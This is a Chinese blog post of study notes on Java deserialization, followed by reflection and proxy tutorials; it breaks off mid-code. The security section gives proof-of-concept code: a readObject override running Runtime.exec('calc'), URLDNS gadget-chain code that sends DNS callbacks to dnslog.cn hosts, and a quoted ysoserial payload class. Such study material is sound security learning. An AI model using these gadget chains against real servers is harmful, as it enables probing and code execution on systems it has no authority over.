---
title: Java 反序列化学习
date: 2025-08-26T15:00:00+08:00
tags:
  - "反序列化"
categories:
  - "Java基础"
description: Java 反序列化学习
showToc: true
draft: false
tocOpen: true
---
# Java 反序列化

# 1、序列化与反序列化

## 1.1 什么是序列化&反序列化

序列化：将内存中的对象压缩成字节流  
反序列化：将字节流转化成内存中的对象



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311749235.png)



## 1.2 为什么有序列化技术

序列化与反序列化的设计就是用来传输数据的。

**应用场景**  
(1) 想把内存中的对象保存到一个文件中或者是数据库当中。  
(2) 用套接字在网络上传输对象。  
(3) 通过RMI传输对象的时候。

## 1.3 几种常见的序列化和反序列化协议
+ XML
+ SOAP（Simple Object Access protocol） 是一种被广泛应用的，基于 XML 为序列化和反序列化协议的结构化消息传递协议
+ JSON（Javascript Object Notation）
+ Protobuf

## 1.4 序列化和反序列化实现
简单分析 Java 的对象序列化的不同写法：

俩种写法本质上都是 Java 的对象序列化，但它们在底层的 IO 流使用方式上略有不同：

**写法一：**

```plain
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
```

传统的基于字节流的文件写入方式：FileOutputStream("ser.bin")， 创建一个 `FileOutputStream`，表示要写入的目标文件是 `ser.bin`

特点：

+ 简单直接，兼容性很好，Java 早期版本就有。
+ 对路径和文件名使用的是 **字符串形式**。

**写法二：（IDEA推荐）**

```plain
ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get("ser.bin")));
```

`**Paths.get("ser.bin")**`

+ 使用 `java.nio.file.Path` 来表示文件路径，比 `String` 更灵活、可组合。
+ 可以方便地处理跨平台路径，比如 `"folder/subfolder/file.txt"`

`**Files.newOutputStream(path)**`

+ 返回一个 `OutputStream`，功能类似 `FileOutputStream`。
+ 基于 NIO（New IO）库，提供更多文件操作选项，

特点：

+ 更现代化的写法，灵活性高，支持 NIO 的各种特性。
+ 更适合与 `Path`、`Files` API 配合，比如检查文件是否存在、创建目录等。



```java
import java.io.Serializable;

//定义一个 Person 类，并声明它实现了 Serializable 接口,这样 Person 的对象就可以被序列化
public class Person implements Serializable {

    //私有成员变量
    private String name;
    private int age;

    //无参构造
    public Person() {}

    //有参构造
    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    //重写 toString() 方法
    @Override
    public String toString() {
        return "Person{" +
        "name='" + name + '\'' +
        ", age=" + age +
        '}';
    }
}
```

```java
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Serialization {

    //定义一个静态方法 serialize(Object obj)，接收一个对象并把它序列化到文件
    public static void serialize(Object obj) throws IOException {
        // ObjectOutputStream：包装文件输出流，使其支持写对象
        ObjectOutputStream oos = new ObjectOutputStream(
            // Files.newOutputStream(...)：创建一个输出流，写入到 ser.bin 文件
            // Paths.get("ser.bin")：得到一个路径对象，表示当前项目目录下的 ser.bin 文件
            Files.newOutputStream(Paths.get("ser.bin"))
        );
        //oos.writeObject(obj)：把传入的 obj 写到文件里（前提是对象必须实现 Serializable 接口）
        oos.writeObject(obj);
    }

    public static void main(String[] args) throws IOException {
        Person person = new Person("aa", 11);
        System.out.println(person);
        //把这个 person 对象写入 ser.bin 文件
        serialize(person);
    }
}
```

```java
import java.io.IOException;
import java.io.ObjectInputStream;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Unserialize {

    //定义一个静态方法 unserialize，接收序列化后的二进制文件
    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        //new ObjectInputStream(...)：包装成对象输入流，这样可以直接读取对象
        ObjectInputStream ois = new ObjectInputStream(
            // Files.newInputStream(Paths.get(filename))：创建一个输入流，指向 filename 文件
            Files.newInputStream(Paths.get(filename))
        );
        //ois.readObject()：从文件中读取对象
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws IOException, ClassNotFoundException {
        //调用 unserialize("ser.bin")，从 ser.bin 文件里反序列化得到一个对象，强制转换为 Person 类型
        Person person = (Person) unserialize("ser.bin");
        System.out.println(person);
    }
}
```

<font style="color:#080808;background-color:#ffffff;">Serialization 创建 Person 对象并将其序列化保存到文件 ser.bin</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311749774.png)

生成的 <font style="color:#080808;background-color:#ffffff;"> ser.bin </font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311750280.png)

<font style="color:#080808;background-color:#ffffff;">Unserialize  从 ser.bin 文件里恢复（反序列化）一个对象  </font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311750920.png)



**总的来说：**

 在 `serialize` 方法中，先通过输出流对象 `new FileOutputStream("ser.bin")`【等价于 `Files.newOutputStream(Paths.get("ser.bin"))`】创建文件输出通道，然后将输出流包装成 `ObjectOutputStream`，再调用 `writeObject` 方法将对象序列化并写入文件。

 在 `unserialize` 方法中，先通过输入流对象 `new FileInputStream("ser.bin")`【等价于 `Files.newInputStream(Paths.get("ser.bin"))`】创建文件输入通道，然后将输入流包装成 `ObjectInputStream`，再调用 `readObject` 方法将文件中的二进制数据读取出来并反序列化成对象。  



## 1.5 为什么会产生安全问题？
只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力。

1. <font style="color:rgb(51, 51, 51);">入口类的</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">readObject</font>`<font style="color:rgb(51, 51, 51);">直接调用危险方法</font>
2. <font style="color:rgb(51, 51, 51);">入口参数中包含可控类，该类有危险方法，readObject 时调用</font>
3. <font style="color:rgb(51, 51, 51);">入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用</font>
4. <font style="color:rgb(51, 51, 51);">构造函数/静态代码块等类加载时隐式执行</font>

### 1.5.1 入口类的 `readObject` 直接调用危险方法
Person 类中写入：

```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    //调用默认的反序列化过程
    ois.defaultReadObject();
    //执行了一个系统命令
    Runtime.getRuntime().exec("calc");
}
```

 反序列化时 JVM 会先调用 Person 类中自定义的 `readObject` 方法，而其中加入了命令执行逻辑，因此对象恢复过程中就触发了计算器的运行。  

依次执行序列化、反序列化，弹出计算器：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311751914.png)



### 1.5.2 入口参数中包含可控类，该类有危险方法，readObject 时调用  
为什么HashMap要自己实现writeObject和readObject方法？

[https://juejin.cn/post/6844903954774491144](https://juejin.cn/post/6844903954774491144)



```java
import java.io.*;
import java.net.URL;
import java.util.HashMap;

public class Test01 implements Serializable {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        HashMap<URL, Integer> hash = new HashMap<>();
        URL u = new URL("http://w9ge5j.dnslog.cn");
        hash.put(u, 1);

        serializableTest(hash);
        unserializableTest("dns.txt");
    }

    // 序列化
    public static void serializableTest(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("dns.txt"));
        oos.writeObject(obj);
    }

    // 反序列化
    public static Object unserializableTest(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object o = ois.readObject();
        return o;
    }
}
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752489.png)

`URL` 类在 JDK 里是自带的类，它的 `hashCode()` 方法里会触发 DNS 解析  

 入口参数里包含了可控的类（`URL`），而该类在反序列化过程中会自动调用危险方法（`hashCode()` 触发 DNS 解析），那么在 `readObject()` 反序列化时就会执行这些危险逻辑，造成安全风险。  



#### HashMap 找入口类分析：
本例中的代码利用了 <font style="color:#080808;background-color:#ffffff;">HashMap<URL, Integer></font>，那么看看为什么它会造成漏洞

跟进 HashMap ，此处继承了 <font style="color:#080808;background-color:#ffffff;">Serializable</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752099.png)

找到重写的 readObject

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752120.png)

跟进 hash

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752777.png)

跟进 hashCode,<font style="color:rgb(80, 80, 92);">hashCode 位置处于 Object 类当中</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752211.png)

这样，HashMap 完美满足了可序列化、重写 readObject、接收任意对象作为参数、JDK 自带的入口类条件。







### <font style="color:rgb(51, 51, 51);">1.5.3 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用</font>


### <font style="color:rgb(51, 51, 51);">1.5.4 构造函数/静态代码块等类加载时隐式执行</font>
```java
public String toString() {
    	 try {
                Runtime.getRuntime().exec("calc");
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
}  

//对obj对象进行输出 默认调用原始对象的toString 方法
System.out.println(obj);
```

 在 `toString()` 中写入危险逻辑，那么只要对象在打印时被隐式调用，就会自动执行恶意代码  



## 1.6 找漏洞的三个条件
首先一个前提：**<font style="color:rgb(80, 80, 92);">继承了 </font>**<font style="color:#080808;background-color:#ffffff;">Serializable</font><font style="color:rgb(80, 80, 92);">，使对象可序列化</font>

+ 入口类 source	
    - 可序列化
    - 重写 readObject 调用常见函数
    - 接收任意对象作为参数，参数类型宽泛
    - 最后 JDK 自带
+ 调用链 gadget chain
+ 执行类 sink 
    - <font style="color:rgb(80, 80, 92);">RCE SSRF 写文件等等</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752309.png)



# <font style="color:rgb(76, 76, 87);">2、Java 反射+URLDNS 链</font>
## 2.1 Java 反射理解
> <font style="color:rgb(37, 41, 51);">谈谈Java反射：从入门到实践，再到原理</font>
>
> [https://juejin.cn/post/6844904025607897096](https://juejin.cn/post/6844904025607897096)
>



反射的作用：让 Java 具有动态性

### 2.1.1 静态语言 VS 动态语言
Java 本身使一种静态语言，编译时就决定了类型：

```java
//编译器认为 student 的类型是 Student，
Student student = new Student();
```

而动态语言，比如PHP：

```php
<?php
$var = "hello";  // 此时 $var 是字符串
$var = 123;      // 运行时再赋值，现在 $var 就是整数
```

再次对比：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753866.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753415.png)



### <font style="color:rgb(76, 76, 87);">2.1.2 正射与反射</font>
[官方对反射的解释](https://docs.oracle.com/javase/8/docs/technotes/guides/reflection/index.html)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753682.png)



**反射机制**使Java代码能够探查已加载类的字段、方法及构造函数信息，并在安全限制范围内，通过反射字段、方法和构造函数对这些底层对应元素进行操作。该 API 既支持需要访问目标对象公共成员（基于其运行时类）的应用程序，也支持访问给定类声明成员的场景，同时允许程序抑制默认的反射访问控制。



**正射（直接调用）：在未运行时（编译时）已经知道了要运行的类** **Student**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753359.png)

**反射：在运行的时候 forName 从 className="com.demo02.Student" 加载 Student 类，再去调用方法**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311754403.png)

### 2.1.3 Class 对象理解
<font style="color:rgb(37, 41, 51);"> 先理解 ：</font>**<font style="color:rgb(37, 41, 51);">RTTI（Run-Time Type Identification）运行时类型识别</font>**

Java 在运行时识别对象和类的信息主要以俩种方式：一种是 RTTI ，它假定我们在编译期已知道了所有类型；另一种是 反射，在运行时发现和使用类的信息。

**<font style="color:rgb(37, 41, 51);">每个类都有一个Class对象</font>**<font style="color:rgb(37, 41, 51);">，每当编译一个新类就产生一个Class对象（更恰当地说，是被保存在一个同名的.class文件中）。</font>

<font style="color:rgb(37, 41, 51);">比如创建一个Student类，那么，JVM就会创建一个Student对应Class类的Class对象，该Class对象保存了Student类相关的类型信息。</font>

**<font style="color:rgb(37, 41, 51);">Class类的对象作用</font>**<font style="color:rgb(37, 41, 51);">是运行时提供或获得某个对象的类型信息</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311754008.webp)



## 2.2 反射使用
### 2.2.1 反射中极为重要的方法
+ 获取类的方法：forName
+ 实例化类对象的方法：newInstance
+ 获取函数的方法：getMethod
+ 执行函数的方法：invoke

### 2.2.2 获取 Class 类对象
+ 已知**具体的类**，通过类的 **class** 属性获取，

```java
Class clazz = Person.class;
```

+ 已知某个**类的实例**，调用该实例的 **getClass() **方法获取 Class 对象

```java
Class clazz = person.getClass();
```

+ 已知一个**类的全类名**，且该类在类路径下，可通过 Class 类的**静态方法 forName()** 获取，可能抛出 ClassNotFoundException

```java
Class clazz = Class.forName("demo01.Student");
```

```java
package com.kuang.reflection;

//测试 class 类的创建方式有哪些
public class Test03 {
    public static void main(String[] args) throws ClassNotFoundException {
        Person person = new Student();
        System.out.println("这个人是："+person.name);

        //方式一：通过对象获得
        Class c1 = person.getClass();
        System.out.println(c1.hashCode());

        //方式二：foename 获得
        Class c2 = Class.forName("com.kuang.reflection.Student");
        System.out.println(c2.hashCode());

        //方式三：通过类名 .class 获得
        Class c3 = Student.class;
        System.out.println(c3.hashCode());

        //方式四：基本内置类型的包装类都有一个 Type 属性
        Class c4 = Integer.TYPE;
        System.out.println(c4);

        //获得父类类型
        Class c5 = c1.getSuperclass();
        System.out.println(c5);
    }
}

class Person {
    String name;

    public Person() {
    }

    public Person(String name) {
        this.name = name;
    }

    @Override
    public String toString() {
        return "Person{" +
        "name='" + name + '\'' +
        '}';
    }
}

class Student extends Person {
    public Student() {
        this.name = "student";
    }
}

class Teacher extends Person {
    public Teacher() {
        this.name = "Teacher";
    }
}
```

### 2.2.3 实例化/创建对象
> 因为 Class 类是 `private` 私有属性，我们也无法通过创建对象的方式来获取 class 对象

+ 通过 Class 的 **newInstance() **方法

```java
//newInstance 不能传参
Person p1 = (Person) c.newInstance();
System.out.println(p1);
```

+ 通过 Constructor 的 newInstance() 方法

```java
        // getConstructor(Class<?>... parameterTypes)
        Constructor personconstructor = c.getConstructor(String.class, int.class);
        Person p2 = (Person) personconstructor.newInstance("asd", 11);
        System.out.println(p2);
```



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755212.png)

### 2.2.3 获取类里面的属性 Filed
+ getField(<font style="color:#080808;background-color:#ffffff;">String name</font>)：指定变量名，可获得 public 类型的属性
+ getFields()：获得类的 public 类型的属性
+ getDeclaredField(<font style="color:#080808;background-color:#ffffff;">String name</font>)：指定变量名，可获得所有类型的属性
+ getDeclaredFields()：获得类的所有类型的属性

```java
//获取类里面的属性
Field[] personfields1 = c.getFields();
for (Field field : personfields1) {
    System.out.println(field);
}

System.out.println("==================================");

Field[] personfields2 = c.getDeclaredFields();
for (Field field : personfields2) {
    System.out.println(field);
}

System.out.println("==================================");

Field idfield = c.getField("id");
System.out.println(idfield);

System.out.println("==================================");

Field allfield = c.getDeclaredField("age");
System.out.println(allfield);
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755559.png)

### 2.2.4 获取类的方法 Method
+ getMethod(String name, Class<?>... parameterTypes)：指定方法名和参数类型，可获得 public 方法（包含父类继承的）。
+ getMethods()：获得类及父类的所有 public 方法。
+ getDeclaredMethod(String name, Class<?>... parameterTypes)：指定方法名和参数类型，可获得本类声明的任意方法（包括 private、protected、默认、public）。
+ getDeclaredMethods()：获得类中声明的所有方法（不含父类）。

### 2.2.5 获取类的构造器 Constructor
+ getConstructor(Class<?>... parameterTypes)：指定参数类型，可获得 public 构造器。
+ getConstructors()：获得类的所有 public 构造器。
+ getDeclaredConstructor(Class<?>... parameterTypes)：指定参数类型，可获得类的任意构造器（包括 private）。
+ getDeclaredConstructors()：获得类的所有构造器（不论修饰符）。



## 2.3 URLDNS 链
[https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)

URLDNS 是  ysoserial 中的一个利用链：

 *   Gadget Chain:

 *     HashMap.readObject()

 *       HashMap.putVal()

 *         HashMap.hash()

 *           URL.hashCode()

### 分析：
首先是因为 HashMap（java/util/HashMap.java） 中重写了 readObject() 方法，HashMap.readObject() 通过 <font style="color:#080808;background-color:#ffffff;">K key = (K) s.readObject(); 进行反序列化，之后调用  putVal() -> hash()，在 hash() 中调用了 hashCode() ；【关于 HashMap 的分析：</font>[HashMap 找入口类分析](#KmszU)<font style="color:#080808;background-color:#ffffff;">】</font>

<font style="color:#080808;background-color:#ffffff;">接下来查看 URL（java/net/URL.java），URL 中继承了 </font>**<font style="color:#080808;background-color:#ffffff;">Serializable，</font>**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755415.png)

跟进 hashCode

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755653.png)

`getHostAddress(u)` 会尝试把 URL 中的主机名解析成一个 `InetAddress` 对象（也就是 IP 地址）， 如果主机名解析成功（`addr` 不为 null），就把解析出来的 IP 地址的 `hashCode()` 加入到 `h`（整个 URL 的哈希值）里  ； 如果 DNS 没解析成功（`addr == null`），那就直接取 URL 原始的 `host` 字符串  

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755421.png)

跟进 getHostAddress，<font style="color:#080808;background-color:#ffffff;">InetAddress.getByName(host)方法会去解析主机名，</font>

+ 如果 `host` 是 IP 地址，直接转换成 `InetAddress`，不会走 DNS
+ 如果 `host` 是域名，这里就会向系统的 **DNS 解析器** 发起请求，解析成 IP

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756610.png)

****

****

**完整的利用链：**

 HashMap.readObject()

-> HashMap.putVal()

-> HashMap.hash()

-> URL.hashCode()

-> <font style="color:#080808;background-color:#ffffff;">URLStreamHandler.hashCode()</font>

-> <font style="color:#080808;background-color:#ffffff;">URLStreamHandler.hashCode.</font>getHostAddress()

-> getHostAddress.<font style="color:#080808;background-color:#ffffff;">InetAddress.getByName()  【这里发出 DNS 请求】</font>



### 复现：
```java
HashMap<URL,Integer> hashmap = new HashMap<URL,Integer>();
hashmap.put(new URL("http://9zuzrq.dnslog.cn"),1);
serialize(hashmap);
```

首先执行序列化，发现触发了dns 请求？

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756014.png)

回到源码中：当 hashCode 不为 -1 时，直接返回 hashCode，不再执行下面代码

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756302.png)

我们知道，第一次将 key（也就是 dnslog）传入 URL.hashCode 时，hashCode == -1（-1 表示没有计算过），执行 hashCode = handler.hashCode(this); ，而根据之前的分析，  handler.hashCode  -> getHostAddress -> InetAddress.getByName(host) -> 发起dns请求，所以说，序列化本身没有发起 dns请求，是因为 HashMap 在序列化过程中调用了 URL.hashCode() ，URL.hashCode() 解析主机名发起 DNS 请求。



那么如何不在第一次发起请求？



```java
HashMap<URL,Integer> hashmap = new HashMap<URL,Integer>();
//这里不使用 put
URL url = new URL("http://yjgubh.dnslog.cn");
Class c = url.getClass();
Field hashcodefield = c.getDeclaredField("hashCode");
hashcodefield.setAccessible(true);
//人为修改 URL.hashCode 缓存值，
hashcodefield.set(url,12134);
//由于 hashCode != -1，它直接返回 12134，不会触发 DNS，只是把 URL 当 key 存进去
//存进去之后：此时 HashMap 内部只记录：key = URL("http://xx.dnslog.cn");key 的 hash 值 = 12134;value = 1
hashmap.put(url,1);
//反序列化之前把 hashcode 改回 -1,恢复 URL.hashCode 的默认状态,下一次调用 url.hashCode() 时，会重新计算并触发 DNS 解析
hashcodefield.set(url,-1);
serialize(hashmap);
```

序列化的过程就不会 DNS 解析：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756901.png)

只有反序列化的时候触发 DNS 解析：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757978.png)



### 学习 ysoserial 中的 URLDNS：
```java
@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest(skip = "true")
@Dependencies()
@Authors({ Authors.GEBL })
public class URLDNS implements ObjectPayload<Object> {

        public Object getObject(final String url) throws Exception {

                //避免提前解析
                //Avoid DNS resolution during payload creation
                //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
                URLStreamHandler handler = new SilentURLStreamHandler();

                //创建 HashMap + URL
                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(null, url, handler); // URL to use as the Key
                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

                //重置 URL 的缓存 hashCode
                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

                return ht;
        }

        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }

        /**
         * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
         * using the serialized object.</p>
         *
         * <b>Potential false negative:</b>
         * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
         * second resolution.</p>
         */
        static class SilentURLStreamHandler extends URLStreamHandler {

                protected URLConnection openConnection(URL u) throws IOException {
                        return null;
                }

                protected synchronized InetAddress getHostAddress(URL u) {
                        return null;
                }
        }
}
```



ysoserial 为了避免第一次序列化时就发起 DNS 请求，它使用了 SilentURLStreamHandler() 内部类自定义了 handler ，覆盖原来的 URL.hashCode.<font style="color:#080808;background-color:#ffffff;">handler，当第一次请求时，进入 SilentURLStreamHandler.getHostAddress  和  SilentURLStreamHandler.openConnection  ，都返回 null ，避免 DNS 请求和访问网络。这样在创建 payload 的阶段就不会触发 DNS ，而反序列化时，hashCode == -1，触发原本的 getHostAddress 触发 DNS 请求。</font>



## 2.4 利用 Runtime
```java
package com.demo01;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class Runtime {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        // 1. 获取 Runtime 类
        Class<?> runtimeClass = Class.forName("java.lang.Runtime");

        // 2. 获取 getRuntime() 方法
        Method getRuntimeMethod = runtimeClass.getMethod("getRuntime");

        // 3. 调用 getRuntime() 获取 Runtime 对象
        Object runtimeInstance = getRuntimeMethod.invoke(null);

        // 4. 获取 exec(String) 方法
        Method execMethod = runtimeClass.getMethod("exec", String.class);

        // 5. 调用 exec() 执行 calc.exe
        execMethod.invoke(runtimeInstance, "calc.exe");
    }
}
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757810.png)



# 3、JDK 动态代理
参考文章：

> [代理模式(狂神)](https://www.yuque.com/taohuayuanpang/kfw7zl/rpagg11nwkzm2qh2#nIfNv)
>
> <font style="color:rgb(25, 27, 31);">设计模式（四）——搞懂什么是代理模式</font>[https://zhuanlan.zhihu.com/p/72644638](https://zhuanlan.zhihu.com/p/72644638)
>

  

**代理模式即 SpringAOP 的底层**

**代理模式分为静态代理和动态代理**

原型：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757644.png) 



## 3.1 **静态代理**
角色分析：

+ 抽象角色 ： 一般会使用接口或者抽象类来解决
+ 真实角色 ：被代理角色
+ 代理角色 ：代理真实角色，
+ 客户 ：访问代理对象的人

代理模式的好处：

+ 可以使真实角色的操作更加纯粹，不用关注一些公共的业务
+ 公共也交给代理角色，实现了业务的分工
+ 公共业务发生扩展的时候，方便集中管理

缺点：

+ 一个真实角色就会产生一个代理角色，代码量翻倍，开发效率会变低



```java
package com.kuang.demo01;

//租房
public interface Rent {

    public void rent();

}
```

```java
package com.kuang.demo01;

//房东
public class Host implements Rent{

    @Override
    public void rent() {
        System.out.println("房东要出租房子");
    }
}
```

```java
package com.kuang.demo01;

public class Client {

    public static void main(String[] args) {
        //房东要租房子
        Host host = new Host();
        //代理，中介帮房东租房子，但是代理会有一些附属操作
        Proxy proxy = new Proxy(host);
        //你不用面对房东，直接找中介租房子
        proxy.rent();
    }
}
```

```java
package com.kuang.demo01;

public class Proxy implements Rent{

    private Host  host;

    public Proxy() {

    }

    public Proxy(Host host) {
        this.host = host;
    }

    @Override
    public void rent() {
        host.rent();
        seeHouse();
        fare();
        hetong();
    }

    //看房
    public void seeHouse() {
        System.out.println("中介带你看房");
    }

    //收中介费
    public void fare() {
        System.out.println("中介收取中介费");
    }

    //签租赁合同
    public void hetong() {
        System.out.println("中介签租赁合同");
    }
}
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757637.png)



另一例:

```java
package com.kuang.demo02;

public interface UserService {
    public void add();
    public void delete();
    public void update();
    public void query();
}
```

```java
package com.kuang.demo02;

//真实对象
public class UserServiceImpl implements UserService {

    @Override
    public void add() {
        System.out.println("增加了一个用户");
    }

    @Override
    public void delete() {
        System.out.println("删除了一个用户");
    }

    @Override
    public void update() {
        System.out.println("修改了一个用户");
    }

    @Override
    public void query() {
        System.out.println("查询了一个用户");
    }
}
```

```java
package com.kuang.demo02;

public class UserServiceProxy implements UserService {

    private UserServiceImpl userService;

    public void setUserService(UserServiceImpl userService) {
        this.userService = userService;
    }

    @Override
    public void add() {
        log("add");
        userService.add();
    }

    @Override
    public void delete() {
        log("delete");
        userService.delete();
    }

    @Override
    public void update() {
        log("update");
        userService.update();
    }

    @Override
    public void query() {
        log("query");
        userService.query();
    }

    //日志方法
    public void log(String msg) {
        System.out.println("[Debug] 使用了"+msg+"方法");
    }
}
```

```java
package com.kuang.demo02;

public class Client {
    public static void main(String[] args) {
        UserServiceImpl userService = new UserServiceImpl();
        //代理类
        UserServiceProxy proxy = new UserServiceProxy();
        //使用代理类实现日志功能！
        proxy.setUserService(userService);
        proxy.add();
    }
}
```



<font style="color:rgb(255, 0, 0);">在不改变原来的代码的情况下，实现了对原有功能的增强，这是AOP中最核心的思想</font>



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757323.png)



## 3.2 动态代理
+ 动态代理和静态代理角色一样
+ 动态代理的代理类是动态生成的，不是我们直接写好的
+ 动态代理分为俩大类：基于接口的动态代理，基于类的动态代理
    - 基于接口--JDK 动态代理
    - 基于类--cglib
    - java 字节码实现：javasist

<font style="color:#080808;background-color:#ffffff;">了解俩个类：</font>

+ Proxy：代理
+ <font style="color:#080808;background-color:#ffffff;">InvocationHandler：调用处理程序</font>

**<font style="color:rgb(255, 0, 0) !important;background-color:rgb(248, 248, 248) !important;">动态代理的好处</font>**

<font style="color:rgba(0, 0, 0, 0.9);">静态代理有的它都有，静态代理没有的，它也有！</font>

+ <font style="color:rgba(0, 0, 0, 0.9);">可以使得我们的真实角色更加纯粹 . 不再去关注一些公共的事情 .</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">公共的业务由代理来完成 . 实现了业务的分工 ,</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">公共业务发生扩展时变得更加集中和方便 .</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">一个动态代理 , 一般代理某一类业务</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">一个动态代理可以代理多个类，代理的是接口！</font>

案例一

```java
package com.kuang.demo03;

//房东
public class Host implements Rent {
    @Override
    public void rent() {
        System.out.println("房东要出租房子");
    }
}
```

```java
package com.kuang.demo03;

//租房
public interface Rent {
    public void rent();
}
```

```java
package com.kuang.demo03;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;

//使用此类自动生成代理类
public class ProxyInvocationHangler implements InvocationHandler {

    //被代理的接口
    private Rent rent;

    public void setRent(Rent rent) {
        this.rent = rent;
    }

    //生成得到代理类
    public Object getProxy() {
        return Proxy.newProxyInstance(this.getClass().getClassLoader(),
                                      rent.getClass().getInterfaces(), this);
    }

    //处理代理实例，并返回结果
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        //动态代理的本质，就是使用反射机制实现
        seeHouse();
        Object result = method.invoke(rent, args);
        //return method.invoke(rent, args);
        fare();
        return result;
    }

    public void seeHouse() {
        System.out.println("中介带看房子");
    }

    public void fare() {
        System.out.println("收中介费");
    }

}
```

```java
package com.kuang.demo03;

public class Client {
    public static void main(String[] args) {
        //真实角色
        Host host = new Host();
        //代理角色，现在没有
        ProxyInvocationHangler pih = new ProxyInvocationHangler();
        //通过调用程序处理角色来处理我们要调用的接口对象
        pih.setRent(host);
        Rent proxy = (Rent) pih.getProxy();
        proxy.rent();
    }
}
```



案例二：

```java
package com.kuang.demo04;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;

//使用此类自动生成代理类
public class ProxyInvocationHangler implements InvocationHandler {

    //被代理的接口
    private Object target;

    public void setTarget(Object target) {
        this.target = target;
    }

    //生成得到代理类
    public Object getProxy() {
        return Proxy.newProxyInstance(this.getClass().getClassLoader(),
                                      target.getClass().getInterfaces(), this);
    }

    //处理代理实例，并返回结果
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        log(method.getName());
        //动态代理的本质，就是使用反射机制实现
        return method.invoke(target, args);
    }

    public void log(String msg) {
        System.out.println("执行了"+msg+"方法");
    }
}
```

```java
package com.kuang.demo04;

import com.kuang.demo02.UserService;
import com.kuang.demo02.UserServiceImpl;

public class Client {
    public static void main(String[] args) {
        //真实角色
        UserServiceImpl userService = new UserServiceImpl();
